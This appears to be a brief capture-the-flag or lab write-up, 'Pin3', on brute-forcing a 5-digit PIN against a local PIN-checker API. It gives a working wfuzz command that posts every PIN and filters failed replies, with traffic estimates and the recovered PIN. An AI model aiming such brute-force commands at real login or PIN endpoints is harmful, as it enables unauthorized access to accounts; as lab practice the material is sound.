## Pin3
Bruteforcing a 5-digit pin towards a PIN-checker API.

Use e.g. wfuzz:
  seq -w 1 99999 | wfuzz -X POST -d "pin=FUZZ" -u http://localhost:36963/api/checkpin -z stdin --hc 401

Each request is ~220 bytes
Each reply   is ~315 bytes

===> ~3MB data received and ~4MB data sent for a successful brute (1 -> 12945)
